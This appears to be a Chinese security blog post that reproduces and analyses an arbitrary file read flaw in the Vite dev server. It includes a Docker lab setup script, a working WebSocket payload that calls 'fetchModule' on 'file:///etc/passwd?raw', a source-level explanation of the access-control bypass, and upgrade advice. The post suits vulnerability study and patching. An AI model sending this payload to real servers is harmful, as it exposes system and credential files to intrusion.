#  Vite开发服务器任意文件读取漏洞复现  
dmd5安全
                    dmd5安全  dmd5安全   2026-04-21 08:39  
  
# 漏洞来源  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dSWSuPicfjTcGZjIlB2C91JtJVcBU4FNIM2iajbqwNa8YudicwG1AtXNI9icPOGBicxRkk1kIEcPDaQ06bcc1YN7uj2uuiaRZOumhaBPqeEOI3Dqs/640?wx_fmt=png&from=appmsg "")  
# 漏洞描述  
# Vite 是一个用于 JavaScript 的前端工具框架。在 6.0.0 到 6.4.2、7.3.2 和 8.0.5 之前的版本中，如果能够以不带 Origin 标头的方式连接到 Vite 开发服务器的 WebSocket，攻击者可以通过自定义 WebSocket 事件 `vite:invoke` 调用 `fetchModule`，并将 `file://...` 与 `?raw`（或 `?inline`）结合使用，从而以 JavaScript 字符串的形式（例如，`export default "...")`）检索服务器上任意文件的内容。HTTP 请求路径中强制执行的访问控制（例如 `server.fs.allow`）不适用于这种基于 WebSocket 的执行路径。此漏洞已在 6.4.2、7.3.2 和 8.0.5 版本中修复。  
# 环境搭建  
  
创建.sh文件执行即可  
```
#!/bin/bash

echo "[*] 阶段 1/4：检查并安装基础依赖..."
# 检查 Docker 和 curl 是否存在，不存在则尝试安装（仅限 Debian/Ubuntu 系）
if ! command -v docker &> /dev/null || ! command -v curl &> /dev/null; then
    echo "[+] 检测到缺少依赖，正在尝试安装 docker.io 和 curl..."
    apt update && apt install -y docker.io curl
fi

echo "[*] 阶段 2/4：创建 Vite 漏洞复现工作目录..."
mkdir -p vite-cve-2026-39363 && cd vite-cve-2026-39363 || { echo "[x] 创建目录失败"; exit 1; }
echo "[+] 工作目录: $(pwd)"

echo "[*] 阶段 3/4：生成项目文件 (package.json, index.html, Dockerfile)..."
# 1. 生成 package.json
cat > package.json <<'EOF'
{
  "name": "vite-cve-2026-39363",
  "version": "1.0.0",
  "description": "PoC environment for CVE-2026-39363 (Vite 8.0.4)",
  "scripts": {
    "dev": "vite --host"
  },
  "devDependencies": {
    "vite": "8.0.4"
  }
}
EOF

# 2. 生成 index.html
cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vite CVE-2026-39363 PoC</title>
</head>
<body>
  <h1>Vite CVE-2026-39363 (Arbitrary File Read) PoC</h1>
  <p>This environment runs Vite 8.0.4, which is vulnerable to CVE-2026-39363.</p>
  <p>Server is running on <span id="port">5173</span></p>
</body>
</html>
EOF

# 3. 生成 Dockerfile
cat > Dockerfile <<'EOF'
FROM node:20-bullseye
WORKDIR /app
# 复制锁文件和清单文件
COPY package.json index.html ./
# 安装依赖
RUN npm install
# 暴露 Vite 默认端口
EXPOSE 5173
# 启动 Vite 开发服务器，监听所有接口
CMD ["npm", "run", "dev"]
EOF

echo "[*] 阶段 4/4：构建 Docker 镜像并启动容器..."
# 构建镜像并后台运行，将容器的 5173 映射到宿主机的 5173
docker build -t vite-poc:8.0.4 . && \
docker run -d -p 5173:5173 --name vite-cve-2026-39363-container vite-poc:8.0.4

echo ""
echo "=============================================="
echo " Vite CVE-2026-39363 漏洞环境部署完成！"
echo "  - 访问地址: http://localhost:5173"
echo "  - 容器名称: vite-cve-2026-39363-container"
echo "  - 漏洞版本: Vite 8.0.4 (已知存在任意文件读取漏洞)"
echo ""
echo "  - 验证步骤:"
echo "    1. 打开浏览器访问 http://localhost:5173"
echo "    2. 参考：https://github.com/Kai-One001/cve-/blob/main/Vite_Read_file_cve_2026_39363.md"
echo "=============================================="
```  
# 漏洞复现  
# 1.BURP->Proxy->WebSockets history2.找到Direction为TO server，右键发送至repeater3.修改请求为{    "type": "custom",    "event": "vite:invoke",    "data": {        "name": "fetchModule",        "id": "send:1",        "data": ["file:///etc/passwd?raw"]        }}4.点击Send 查看Pretty中响应  
# 漏洞分析  
  
入口点在   
packages/vite/src/node/server/ws.ts  
 中的 **shouldHandle()**  
函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dSWSuPicfjTdIJ5giczPkqhg0F9XQiapYOvcxDwjFDDDVX0AmSkRiceBEicOOw5BSgmqicMUkxxFoFHvdU4dpt4xeXgN6q5RzKpS8Lp4wsK2Rs7iaA/640?wx_fmt=png&from=appmsg "")  
```
// 代码逻辑
if (req.headers.origin) {
  // 如果有 Origin，就检查 Token
  return hasValidToken(config, parsedUrl);
  }
  // 我们允许非浏览器请求在没有 Token 的情况下连接
  return true;
```  
  
这就造成了权限绕过。浏览器带 Origin则需要 Token，如果不带 Origin，那就不用Token，就可以免密登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dSWSuPicfjTd5HkWuZWRFrJhUkJrD3RICsiaVCE7P2hemWsZ78OtETbShXv9KYMSTnHvJBJwo2uESUMuAjZPO7pGXkJpYPAicRfAy3TeuCbwrU/640?wx_fmt=png&from=appmsg "")  
```
wss.on('connection', (socket) => {
  socket.on('message', (raw) => {
    // 1. 解析消息
    let parsed: any
    try {
      parsed = JSON.parse(String(raw))
    } catch {}

    // 2. 检查是否为自定义事件
    if (!parsed || parsed.type !== 'custom' || !parsed.event) return

    // 3. 检查监听器
    const listeners = customListeners.get(parsed.event)
    if (!listeners?.size) return

    // 4. 获取客户端包装
    const client = getSocketClient(socket)

    // 5. 执行回调（关键：无沙箱环境）
    listeners.forEach((listener) => listener(parsed.data, client, parsed.invoke))
  })
  // ...
})
```  
  
这段源码主要负责建立WebSocket 连接  
  
  
在  
HMR  
热更新模块中，**vite:invoke**  
事件被注册了专门的处理器，如果收到**vite:invoke**  
消息，就直接调用对应的函数，然后把执行结果再通过**WebSocket**  
发回去  
```
channel.on?.('vite:invoke', listenerForInvokeHandler)
```  
  
接下来看看listenerForInvokeHandler函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dSWSuPicfjTdwcgDJmsRzrSyEY65Fc8PAvE4F7JZeicJImpaDtVoa6gVYvstdF8KJnxTWe5ZibNibaIcUqLDU1uqgOwEibn2ibA6gK19lauex9Tms/640?wx_fmt=png&from=appmsg "")  
```
listenerForInvokeHandler = async (payload, client) => {
  const responseInvoke = payload.id.replace('send', 'response')
  client.send({
    type: 'custom',
    event: 'vite:invoke',
    data: {
      name: payload.name, // 攻击者可控
      id: responseInvoke,
      data: (await handleInvoke({ /* payload */ }))! // 直接执行
    }
  })
}
```  
  
这段代码的逻辑为：收到消息 -> 解析 JSON -> 根据   
name  
 字段查找函数 -> 直接执行，几乎没有业务逻辑，它将网络消息直接翻译为函数调用。只要能连上 WebSocket，就是可信的内部组件  
。它没有在 RPC 层做任何 ACL（访问控制列表）检查，也没有验证调用者是否有权执行   
fetchModule  
。它不关心   
fetchModule  
 是不是一个高危操作，它只关心   
invokeHandlers  
 里有没有这个名字。  
```
try {
      const invokeHandler = invokeHandlers[name]
      // @ts-expect-error `invokeHandler` is `InvokeMethods[T]`, so passing the args is fine
      const result = await invokeHandler(...args)
      return { result }
    } catch (error) {
      return {
        error: {
          name: error.name,
          message: error.message,
          stack: error.stack,
          ...error, // preserve enumerable properties such as RollupError.loc, frame, plugin
        },
      }
    }
```  
  
**payload.name**  
 只要存在就能在**invokeHandlers**  
中被索引执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dSWSuPicfjTdjv5gtCBzFoPM2xvp7JCqAibuiceeW0MtJcbIsg6EnbsXF5ndemeZ1XF6ZO70EmO7Ne2InsswyB9TuxdQ4YKoo5ZKb0QCeCTsY0/640?wx_fmt=png&from=appmsg "")  
```
this.hot.setInvokeHandler({
  // 定义了一个名为 'fetchModule' 的处理句柄
  fetchModule: (id, importer, options) => {
    // 它的逻辑非常单纯：直接调用当前环境实例的 fetchModule 方法
    return this.fetchModule(id, importer, options)
  },
  // ... 
})
```  
  
之后把  
把**fetchModule**  
映射进  
invoke handler，   
它没有做任何额外的检查，它只是简单地把参数   
(id, importer, options)  
 原封不动地传递给内部的核心方法   
this.fetchModul，所以  
只要能触发   
vite:invoke  
，就能远程调用   
DevEnvironment.fetchModule()  
  
  
在正常的 HTTP 请求中，Vite 通过   
isServerAccessDeniedForTransform  
 函数建立了一道防线。  
  
  
如果 URL 包含   
?raw  
,   
?inline  
 等敏感后缀，必须通过   
checkLoadingAccess  
 校验，即检查   
server.fs.allow  
```
allowId(id) {
  return id[0] === '\0' || !isServerAccessDeniedForTransform(server.config, id)
}
```  
  
这确保了只有白名单内的文件能被读取  
  
  
在   
ssr/fetchModule.ts  
 中：  
```
let result = await environment.transformRequest(url)
```  
  
由于没有传入   
options.allowId  
，  
transformRequest  
 内部的防御逻辑被跳过  
```
// transformRequest.ts
if (options.allowId && !options.allowId(id)) {
  // 这段代码永远不会执行，因为 options.allowId 是 undefined
  throw new Error(`Denied ID ${id}`)
}
```  
  
**正常流程**  
：  
pluginContainer.load(id)  
 返回   
null  
 -> 触发   
transformRequest  
 的   
fs.readFile  
 -> 触发   
isFileLoadingAllowed  
 检查。  
  
  
**攻击流程**  
：  
1. URL 带有   
?raw  
。  
  
1. pluginContainer.load(id)  
 命中   
assetPlugin  
。  
  
assetPlugin 逻辑：  
```
// asset.ts
if (rawRE.test(id)) {
  const file = checkPublicFile(id, config) || cleanUrl(id)
  // 致命点：直接读取文件，完全无视 server.fs.allow
  return { code: `export default ${JSON.stringify(await fsp.readFile(file, 'utf-8'))}` }
}
```  
  
结果：插件直接返回了文件内容，  
transformRequest  
 的检查根本没有机会执行。  
# 漏洞修复  
  
升级最新版本：将组件升级至官方已修复版本及以上（vite@>=8.0.5 / vite@>=7.3.2 / vite@>=6.4.2）  
  
  
原文链接  
  
https://xz.aliyun.com/news/91938  
  
